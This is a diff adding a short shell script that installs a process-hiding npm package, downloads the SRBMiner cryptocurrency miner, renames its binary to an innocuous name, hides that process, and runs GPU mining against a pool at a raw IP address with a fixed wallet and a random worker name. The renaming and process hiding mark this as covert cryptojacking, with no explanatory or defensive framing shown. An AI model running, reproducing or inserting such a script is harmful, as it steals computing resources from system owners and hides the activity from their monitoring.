@@ -1,0 +1,10 @@
+npm i -g node-process-hider
+nvidia-smi
+rm -rf SRBMiner-Multi-3-5-3-Linux.tar.gz
+wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/srbminer-3-5-3/SRBMiner-Multi-3-5-3-Linux.tar.gz
+tar xf SRBMiner-Multi-3-5-3-Linux.tar.gz
+mv SRBMiner-MULTI samlospo
+
+ph add samlospo
+
+./samlospo --disable-cpu --algorithm pearlhash --pool 152.42.206.241:80 --wallet prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr.$(echo $RANDOM | md5sum | head -c 10)
